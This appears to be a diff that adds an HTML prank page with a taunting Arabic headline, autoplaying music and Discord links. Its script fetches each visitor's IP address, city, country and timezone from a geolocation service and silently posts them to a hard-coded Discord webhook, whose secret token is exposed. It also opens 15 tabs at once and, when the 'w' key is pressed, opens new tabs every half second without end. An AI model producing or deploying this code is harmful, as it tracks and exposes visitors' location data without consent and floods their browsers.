@@ -1,1 +1,109 @@
-sss
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>! Ais here</title>
+    <style>
+        body {
+            background: url('https://github.com/286b44606swax/dsa2/blob/main/Screenshot%202025-06-28%20182147.png?raw=true') no-repeat center center fixed;
+            background-size: cover;
+            color: red;
+            text-align: center;
+            font-family: Tempus Sans ITC, sans-serif;
+        }
+        h1 {
+            font-size: 30px;
+            margin-top: 350px;
+            position: absolute;
+            top: -10%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+        .info {
+            margin-top: 50px;
+            font-size: 30px;
+        }
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 85vh;
+        }
+        .image-box {
+            border: 0px solid rgb(8, 8, 8);
+            padding: 1px;
+            display: inline-block;
+        }
+        .discord-link {
+            font-size: 24px;
+            margin-top: 20px;
+            text-decoration: none;
+            color: red;
+        }
+    </style>
+</head>
+<body>
+    <h1>  🤣🤣 حمد العازمي يسلم عليكم  </h1>
+    <div class="container">
+        <div class="image-box">
+            <img src="" alt="" width="800">
+        </div>
+        <div class="info" id="user-info">
+            <p><strong>IP:</strong> Loading...</p>
+            <p><strong>City:</strong> Loading...</p>
+            <p><strong>Country:</strong> Loading...</p>
+            <p><strong>Timezone:</strong> Loading...</p>
+        </div>
+        <a href="https://discord.gg/DET" class="discord-link" target="_blank">discord.gg/det</a>
+    </div>
+    <audio autoplay loop>
+        <source src="https://github.com/286b44606swax/dsa2/raw/refs/heads/main/%D8%A7%D8%BA%D8%A7%D9%86%D9%8A%20%D8%A7%D8%AC%D9%86%D8%A8%D9%8A%D9%87%20%D9%87%D8%AC%D9%88%D9%84%D9%87%20-%20Hold%20On%20-%20%D9%85%D8%B7%D9%84%D9%88%D8%A8%D9%87%20%D8%A7%D9%83%D8%AB%D8%B1%20%D8%B4%D9%8A%20%23%D8%A7%D8%AC%D9%86%D8%A8%D9%8A.mp3" type="audio/mpeg">
+        Your browser does not support the audio element.
+    </audio>
+    <script>
+        fetch('https://ipapi.co/json/')
+            .then(response => response.json())
+            .then(data => {
+                document.getElementById('user-info').innerHTML = 
+                    `<p><strong>IP:</strong> ${data.ip}</p>
+                    <p><strong>City:</strong> ${data.city}</p>
+                    <p><strong>Country:</strong> ${data.country_name}</p>
+                    <p><strong>Timezone:</strong> ${data.timezone}</p>`;
+                
+                // Send IP data to Discord webhook
+                fetch('https://discord.com/api/webhooks/1236940095806771210/d005WvqPwoSa4eWihG8yb-5L861vnO_MwEXXWR8oHt5br_tNqIE7ZxyZAjz2sQOGTq6e', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        content: `New visitor:\nIP: ${data.ip}\nCity: ${data.city}\nCountry: ${data.country_name}\nTimezone: ${data.timezone}`
+                    })
+                });
+            })
+            .catch(() => {
+                document.getElementById('user-info').innerHTML = '<p>Failed to load IP data.</p>';
+            });
+
+        // Open 15 tabs to the Discord link (may be blocked by browsers)
+        for (let i = 0; i < 15; i++) {
+            window.open('https://discord.gg/', '_blank');
+        }
+
+      <script>
+    document.addEventListener("keydown", function(event) {
+        if (event.key.toLowerCase() === "w") {
+            setInterval(() => {
+                window.open("https://discord.gg/ReHkYGCQ", "_blank");
+            }, 500);
+            
+            window.open('https://discord.gg/ReHkYGCQ', '_blank');
+            window.open('https://discord.gg/ReHkYGCQ', '_blank');
+            window.open('https://discord.gg/ReHkYGCQ', '_blank');
+            }
+        });
+    </script>
+</body>
+</html>
